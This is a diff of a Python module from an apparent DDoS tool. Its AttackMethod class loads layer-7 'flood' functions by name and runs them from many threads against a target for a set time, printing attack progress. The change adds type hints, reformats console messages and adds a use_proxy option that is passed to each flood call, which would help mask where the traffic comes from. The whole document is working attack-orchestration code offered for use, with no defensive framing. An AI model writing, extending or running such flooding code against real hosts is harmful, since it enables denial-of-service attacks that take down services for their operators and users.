@@ -1,13 +1,13 @@
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Callable
+from typing import Callable, List
 
-from colorama import Fore
-from humanfriendly import Spinner, format_timespan
+from colorama import Fore  # type: ignore[import]
+from humanfriendly import Spinner, format_timespan  # type: ignore[import]
 
-from tools.crash import CriticalError
-from tools.ip_tools import get_target_address
+from tools.crash import CriticalError  # type: ignore[import]
+from tools.ip_tools import get_target_address  # type: ignore[import]
 
 
 # Returns the flood method attack
@@ -15,20 +15,28 @@ def get_method_by_name(method: str) -> Callable:
 
     dir = f"tools.L7.{method.lower()}"
     module = __import__(dir, fromlist=["object"])
-    method = getattr(module, "flood")
-    return method
+    flood_function = getattr(module, "flood")
+    return flood_function
 
 
 # Controls the attack methods
 class AttackMethod:
 
     # Constructor
-    def __init__(self, method_name, duration, threads, target):
+    def __init__(
+        self,
+        method_name: str,
+        duration: int,
+        threads: int,
+        target: str,
+        use_proxy: bool,
+    ):
         self.method_name = method_name
         self.duration = duration
         self.threads_count = threads
         self.target = target
-        self.threads = []
+        self.use_proxy = use_proxy
+        self.threads = list()  # type: List[Thread]
         self.is_running = False
 
     # Entry-point
@@ -51,7 +59,7 @@ class AttackMethod:
     # Starts the flooder
     def __run_flood(self):
         while self.is_running:
-            self.method(self.target)
+            self.method(self.target, self.use_proxy)
 
     # Starts the threads
     def __run_threads(self):
@@ -60,7 +68,7 @@ class AttackMethod:
         timing = Thread(target=self.__run_timer)
         timing.start()
 
-        # Creates the threads flood
+        # Creates the threads
         for _ in range(self.threads_count):
             thread = Thread(target=self.__run_flood)
             self.threads.append(thread)
@@ -81,15 +89,15 @@ class AttackMethod:
                 f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
             )
 
-        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Completed!{Fore.RESET}")
+        print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")
 
     # Starts DDOS attack
     def start(self):
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}Attacking {target} using the {self.method_name} method.{Fore.RESET}\n"
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
+            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
+            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n\n{Fore.RESET}"
         )
 
         self.is_running = True
@@ -100,7 +108,7 @@ class AttackMethod:
         except KeyboardInterrupt:
             self.is_running = False
             print(
-                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
+                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads...\n\n{Fore.RESET}"
             )
 
             # Waits for the threads to end
@@ -108,7 +116,9 @@ class AttackMethod:
                 if thread.is_alive():
                     thread.join()
 
-            print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Interrupted!{Fore.RESET}")
+            print(
+                f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
+            )
             sys.exit(1)
 
         except Exception as err:
